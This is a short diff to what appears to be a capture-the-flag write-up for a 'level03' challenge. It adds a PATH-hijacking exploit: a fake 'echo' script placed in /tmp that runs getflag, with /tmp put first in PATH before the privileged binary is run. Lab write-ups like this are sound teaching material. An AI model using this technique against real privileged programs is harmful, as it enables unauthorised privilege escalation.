@@ -14,3 +14,12 @@ $ gdb ./level03
 (gdb) x/s 0x80485e0
 0x80485e0:       "/usr/bin/env echo Exploit me"
 ```
+
+We can execute arbitrary code by making sure `env echo` returns our executable.
+
+```shell
+echo '#!/bin/sh' > /tmp/echo
+echo 'getflag' >> /tmp/echo
+chmod +x /tmp/echo
+PATH="/tmp:$PATH" ./level03
+```
